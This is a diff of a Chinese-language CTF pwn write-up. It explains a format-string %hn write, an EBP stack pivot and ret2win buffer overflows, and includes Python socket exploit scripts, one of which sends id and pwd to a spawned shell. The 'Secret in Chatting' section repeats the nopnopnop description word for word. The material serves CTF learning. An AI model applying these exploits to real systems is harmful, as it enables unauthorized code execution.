@@ -740,7 +740,7 @@ s.sendall(payload + b"\n")
 
 time.sleep(0.2)
 
-# evil() 里会 system("/bin/sh")，这里给 shell 发命令
+# 给 shell 发命令
 cmds = [
     b"id\n",
     b"pwd\n",
@@ -778,8 +778,58 @@ flag截图：
 
 ![flag](./pwm/ezstring/main.png)
 
+思路就是：只要合理的控制字符串的输出，就可以利用%n对check修改数据，实现进入win函数的目的。
 
+题目给的值是 0xdeadbeef,由于一次性输出0xdeedbeef的字符过大
+可以分两段输入给check ==> 0xdead 0xbeef
 
+因为程序是小端序，所以低位在低地址，高位在高地址，因此需要：
+
+[check + 0] 写入 0xbeef
+[check + 2] 写入 0xdead
+
+这里附上check的地址
+![check的地址](./pwm/ezstring/check地址.png)
+
+第一段
+
+%1$0xbeefc ==> %1$48879c
+
+第二段
+
+%1$(0xdead-0xbeef)c ==> %1$(57005-48879)c ==> %1$8126c
+
+结合在一起就是
+
+%1$48879c%1$8126c
+
+此时我们还需要伪造参数并写入数据
+
+即%1$48879c + {%参数1的位置$hn} + %1$8126c + {%参数2的位置$hn}
+
+我们还需定位printf参数的位置。一般字符串不长，我们估计参数也就两位数，先不如写成：
+
+%1$48879c + {%xx$hn} + %1$8126c + {%xx的位置$hn}
+
+%1$48879c%xx$hn%1$8126c%xx$hn
+
+共计29字节，
+
+在 64 位 Linux 程序中，前几个参数会优先通过寄存器传递，而本题测试发现，buf + 0x00 对应 printf 的第 6 个参数。由于 64 位地址占 8 字节，因此后续每 8 字节对应一个参数位置：
+
+buf + 0x00	→	第 6 个参数
+buf + 0x08	→	第 7 个参数
+buf + 0x10	→	第 8 个参数
+buf + 0x18	→	第 9 个参数
+buf + 0x20	→	第 10 个参数
+buf + 0x28	→	第 11 个参数
+
+于是向上补齐到32字节，此时[buf + 0]to[buf + 31] 为格式化字符串，占用了参数6to参数9的位置
+
+于是我们只需再加两个参数10,11用于存放[check + 0]和[check + 2]的地址
+
+于是得到
+%1$48879c%10$hn%1$8126c%11$hnAAA + p64(0x4040cc) + p64(0x4040ce)
 
 
 所以有了以下代码：
@@ -796,13 +846,6 @@ def p64(x):
 
 check = 0x4040cc
 
-# 写入 0xdeadbeef：
-# 低 2 字节 beef 写到 check
-# 高 2 字节 dead 写到 check + 2
-#
-# 地址放在 payload 第 32 字节处：
-# 第一个地址是第 10 个参数
-# 第二个地址是第 11 个参数
 fmt = b"%1$48879c%10$hn%1$8126c%11$hn"
 
 payload = fmt
@@ -831,7 +874,6 @@ while True:
     except socket.timeout:
         break
 
-# 输出里会有很多空格，优先提取 flag
 m = re.search(rb"(flag\{[^}]+\}|A1CTF\{[^}]+\})", data)
 if m:
     print("[+] FLAG:", m.group(1).decode())
@@ -839,12 +881,33 @@ else:
     print(data[-3000:].decode(errors="ignore"))
 ```
 
-
+flag:
+![flag](./pwm/ezstring/flag.png)
 
 
 ## baseh
 
+本题的思路：
 
+这里是主逻辑函数：
+
+![主逻辑函数](./pwm/baseh/main.png)
+
+这里粗略看了一下输入，没发现问题，然后绕了一圈定位到了auth函数
+
+![auth函数](./pwm/baseh/bug.png)
+
+这里发现auth函数中局部变量v4有漏洞：
+
+![漏洞原理](./pwm/baseh/baseh.svg)
+
+于是可以通过修改auth函数要返回的ebp，让auth函数返回时，ebp跳转到input的地址上。
+
+然后在input上构造这样的假栈：
+
+![input上的假栈](./pwm/baseh/baseh_input.drawio.svg)
+
+即可让程序在main执行ret后，让esp指向input假栈中的correct地址，从而让eip跳转correct，即执行correct函数
 
 代码：
 ```python
@@ -895,11 +958,11 @@ except:
     pass
 ```
 
+![flag](./pwm/baseh/flag.png)
+
 ## nopnopnop
 
-
-
-
+这一题也是栈溢出，程序会输出Target,解析后向Buffer输入字符覆盖返回地址跳转即可，代码如下：
 
 代码：
 ```python
@@ -966,6 +1029,84 @@ while True:
 print(out.decode(errors="ignore"), end="")
 s.close()
 ```
+
+![flag](./pwm/nopnopnop/flag.png)
+
+## Secret in Chatting
+
+<folder style="3">
+
+这一题也是栈溢出，程序会输出Target,解析后向Buffer输入字符覆盖返回地址跳转即可，代码如下：
+
+代码：
+```python
+import socket
+import struct
+import re
+import time
+
+HOST = "ctf-2.xeed.run"
+PORT = 30087
+
+offset = 0x108
+
+def recv_until(s, mark=b">"):
+    data = b""
+    while mark not in data:
+        chunk = s.recv(1)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+s = socket.create_connection((HOST, PORT), timeout=10)
+s.settimeout(8)
+s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+banner = recv_until(s, b">")
+print(banner.decode(errors="ignore"), end="")
+
+m = re.search(rb"Target:\s*(0x[0-9a-fA-F]+)", banner)
+if not m:
+    print("\n[-] 没找到 Target")
+    exit()
+
+target = int(m.group(1), 16)
+ret_gadget = target - 1   # 0x40127a: ret
+
+print(f"\n[+] target     = {hex(target)}")
+print(f"[+] ret gadget = {hex(ret_gadget)}")
+
+payload = b"A" * offset
+payload += struct.pack("<Q", ret_gadget)
+payload += struct.pack("<Q", target)
+payload += b"\n"
+
+print(f"[+] payload length = {len(payload)}")
+print("[+] sending aligned ret2win payload...")
+
+s.sendall(payload)
+
+# 不要 shutdown
+time.sleep(0.5)
+
+out = b""
+while True:
+    try:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        out += chunk
+    except socket.timeout:
+        break
+
+print(out.decode(errors="ignore"), end="")
+s.close()
+```
+
+</folder>
+
+
 
 | 题目类型 | 题目名 | 难度 |
 | :--- | :--- | :--- |
